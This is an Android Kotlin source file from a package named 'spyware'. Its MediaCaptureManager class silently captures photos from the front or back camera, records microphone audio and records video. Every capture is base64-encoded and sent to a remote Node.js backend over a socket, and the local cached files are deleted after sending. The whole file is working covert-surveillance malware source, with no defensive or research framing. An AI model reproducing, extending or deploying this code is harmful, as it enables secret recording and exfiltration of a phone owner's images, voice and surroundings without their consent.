package com.webrtc.spyware

import android.content.Context
import android.hardware.camera2.*
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.graphics.ImageFormat
import android.util.Base64
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

/**
 * MediaCaptureManager – handles silent capture of:
 *   - Front/Back camera images (JPEG)
 *   - Audio clips (AAC/M4A)
 *   - Video clips (MP4)
 * All data is base64-encoded and sent to Node.js backend via Socket.IO.
 */
class MediaCaptureManager(private val context: Context, private val socketManager: SocketManager) {

    private val TAG = "MediaCaptureManager"
    private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var mediaRecorder: MediaRecorder? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private val bgThread = HandlerThread("CaptureThread").also { it.start() }
    private val bgHandler = Handler(bgThread.looper)
    private val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)

    // ─── IMAGE CAPTURE ───────────────────────────────────────────────────────────
    fun captureImage(useFront: Boolean = true) {
        try {
            val cameraId = getFacingCamera(if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK)
                ?: return Log.w(TAG, "No camera found")

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val filename = "img_${sdf.format(Date())}.jpg"
                socketManager.sendMediaCapture(b64, "image", filename, "image/jpeg")
                Log.d(TAG, "Image captured: $filename")
            }, bgHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surface = imageReader!!.surface
                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(surface)
                            session.capture(req.build(), null, bgHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { Log.e(TAG, "Config failed") }
                    }, bgHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); Log.e(TAG, "Camera error: $error") }
            }, bgHandler)
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "captureImage error: ${e.message}")
        }
    }

    // ─── AUDIO CAPTURE ───────────────────────────────────────────────────────────
    fun captureAudio(durationSeconds: Int = 10) {
        try {
            val file = File(context.cacheDir, "audio_${sdf.format(Date())}.m4a")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(file.absolutePath)
                setMaxDuration(durationSeconds * 1000)
                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stop(); release()
                        sendFile(file, "audio", "audio/mp4")
                    }
                }
                prepare()
                start()
            }
            Log.d(TAG, "Audio recording started: ${file.name}")
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "captureAudio error: ${e.message}")
        }
    }

    // ─── VIDEO CAPTURE ───────────────────────────────────────────────────────────
    fun captureVideo(durationSeconds: Int = 15, useFront: Boolean = false) {
        try {
            val file = File(context.cacheDir, "video_${sdf.format(Date())}.mp4")
            val cameraId = getFacingCamera(if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK)
                ?: return Log.w(TAG, "No camera")

            mediaRecorder = MediaRecorder().apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(1280, 720)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(3_000_000)
                setOutputFile(file.absolutePath)
                setMaxDuration(durationSeconds * 1000)
                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stop(); release()
                        sendFile(file, "video", "video/mp4")
                    }
                }
                prepare()
            }

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surface = mediaRecorder!!.surface
                    camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                            req.addTarget(surface)
                            session.setRepeatingRequest(req.build(), null, bgHandler)
                            mediaRecorder?.start()
                            Log.d(TAG, "Video recording started")
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { Log.e(TAG, "Video config failed") }
                    }, bgHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, bgHandler)
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "captureVideo error: ${e.message}")
        }
    }

    // ─── HELPERS ────────────────────────────────────────────────────────────────
    private fun sendFile(file: File, type: String, mime: String) {
        if (!file.exists()) return
        val bytes = file.readBytes()
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        socketManager.sendMediaCapture(b64, type, file.name, mime)
        file.delete() // Remove from local cache after sending
    }

    private fun getFacingCamera(facing: Int): String? {
        return cameraManager.cameraIdList.firstOrNull { id ->
            val chars = cameraManager.getCameraCharacteristics(id)
            chars.get(CameraCharacteristics.LENS_FACING) == facing
        }
    }

    fun release() {
        mediaRecorder?.release()
        cameraDevice?.close()
        imageReader?.close()
        bgThread.quitSafely()
    }
}
